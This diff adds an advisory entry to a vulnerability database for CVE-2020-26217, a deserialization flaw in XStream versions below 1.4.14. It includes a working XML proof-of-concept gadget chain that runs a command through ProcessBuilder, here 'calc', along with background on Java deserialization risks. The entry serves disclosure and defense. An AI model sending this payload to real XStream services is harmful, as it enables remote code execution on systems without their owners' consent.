@@ -52,6 +52,150 @@
   - https://github.com/victims/victims-cve-db/blob/master/database/java/2013/7285.yaml
   - https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2013-7285
   source_url: https://ossindex.net/resource/package/7015420651/vulnerabilities
+- id: snykio:maven:com.thoughtworks.xstream:xstream:1040458
+  title: Deserialization of Untrusted Data
+  description: |
+    [com.thoughtworks.xstream:xstream][1] is a simple library to serialize
+    objects to XML and back again.
+
+    Affected versions of this package are vulnerable to Deserialization of
+    Untrusted Data. The processed stream at unmarshalling time contains type
+    information to recreate the formerly written objects. XStream creates
+    therefore new instances based on these type information. An attacker can
+    manipulate the processed input stream and replace or inject objects,
+    that can execute arbitrary shell commands.
+
+    This issue is a variation of CVE-2013-7285, this time using a different
+    set of classes of the Java runtime environment, none of which is part of
+    the XStream default blacklist. The same issue has already been reported
+    for Strut\'s XStream plugin in CVE-2017-9805, but the XStream project
+    has never been informed about it.
+
+    ### PoC   {#poc}
+
+        <map>
+          <entry>
+            <jdk.nashorn.internal.objects.NativeString>
+              <flags>0</flags>
+              <value class='com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'>
+                <dataHandler>
+                  <dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'>
+                    <contentType>text/plain</contentType>
+                    <is class='java.io.SequenceInputStream'>
+                      <e class='javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'>
+                        <iterator class='javax.imageio.spi.FilterIterator'>
+                          <iter class='java.util.ArrayList$Itr'>
+                            <cursor>0</cursor>
+                            <lastRet>-1</lastRet>
+                            <expectedModCount>1</expectedModCount>
+                            <outer-class>
+                              <java.lang.ProcessBuilder>
+                                <command>
+                                  <string>calc</string>
+                                </command>
+                              </java.lang.ProcessBuilder>
+                            </outer-class>
+                          </iter>
+                          <filter class='javax.imageio.ImageIO$ContainsFilter'>
+                            <method>
+                              <class>java.lang.ProcessBuilder</class>
+                              <name>start</name>
+                              <parameter-types/>
+                            </method>
+                            <name>start</name>
+                          </filter>
+                          <next/>
+                        </iterator>
+                        <type>KEYS</type>
+                      </e>
+                      <in class='java.io.ByteArrayInputStream'>
+                        <buf></buf>
+                        <pos>0</pos>
+                        <mark>0</mark>
+                        <count>0</count>
+                      </in>
+                    </is>
+                    <consumed>false</consumed>
+                  </dataSource>
+                  <transferFlavors/>
+                </dataHandler>
+                <dataLen>0</dataLen>
+              </value>
+            </jdk.nashorn.internal.objects.NativeString>
+            <string>test</string>
+          </entry>
+        </map>
+
+    *Note:* `1.4.14-jdk7`is optimised for OpenJDK 7, release `1.4.14` are
+    compatible with other JDK projects.
+
+
+
+    [1]: https://x-stream.github.io/
+    \nSerialization is a process of converting an object into a sequence of
+    bytes which can be persisted to a disk or database or can be sent
+    through streams. The reverse process of creating object from sequence of
+    bytes is called deserialization. Serialization is commonly used for
+    communication (sharing objects between multiple hosts) and persistence
+    (store the object state in a file or a database). It is an integral part
+    of popular protocols like *Remote Method Invocation (RMI)*, *Java
+    Management Extension (JMX)*, *Java Messaging System (JMS)*, *Action
+    Message Format (AMF)*, *Java Server Faces (JSF) ViewState*, etc.
+
+    *Deserialization of untrusted data* ([CWE-502][1]), is when the
+    application deserializes untrusted data without sufficiently verifying
+    that the resulting data will be valid, letting the attacker to control
+    the state or the flow of the execution.
+
+    Java deserialization issues have been known for years. However, interest
+    in the issue intensified greatly in 2015, when classes that could be
+    abused to achieve remote code execution were found in a [popular library
+    (Apache Commons Collection)][2]. These classes were used in zero-days
+    affecting IBM WebSphere, Oracle WebLogic and many other products.
+
+    An attacker just needs to identify a piece of software that has both a
+    vulnerable class on its path, and performs deserialization on untrusted
+    data. Then all they need to do is send the payload into the
+    deserializer, getting the command executed.
+
+    > Developers put too much trust in Java Object Serialization. Some even
+    > de-serialize objects pre-authentication. When deserializing an Object
+    > in Java you typically cast it to an expected type, and therefore
+    > Java\'s strict type system will ensure you only get valid object
+    > trees. Unfortunately, by the time the type checking happens, platform
+    > code has already created and executed significant logic. So, before
+    > the final type is checked a lot of code is executed from the
+    > readObject() methods of various objects, all of which is out of the
+    > developer\'s control. By combining the readObject() methods of various
+    > classes which are available on the classpath of the vulnerable
+    > application an attacker can execute functions (including calling
+    > Runtime.exec() to execute local OS commands).
+
+    * Apache Blog
+
+
+
+    [1]: https://cwe.mitre.org/data/definitions/502.html
+    [2]: https://snyk.io/vuln/SNYK-JAVA-COMMONSCOLLECTIONS-30078
+  affected_package: com.thoughtworks.xstream:xstream
+  vulnerable_versions:
+  - "< 1.4.14"
+  severity: high
+  package_manager: maven
+  cve:
+  - CVE-2020-26217
+  cwe:
+  - CWE-502
+  disclosed_date: 2020-11-16
+  created_date: 2020-11-16
+  last_modified_date: 2020-11-16
+  credit:
+  - Hui Lu
+  - Zhihong Tian
+  references:
+  - https://github.com/x-stream/xstream/commit/0fec095d534126931c99fd38e9c6d41f5c685c1a
+  - https://x-stream.github.io/CVE-2020-26217.html
+  source_url: https://snyk.io/vuln/SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-1040458
 - id: snykio:maven:com.thoughtworks.xstream:xstream:30088
   title: Insecure XML deserialization
   description: |
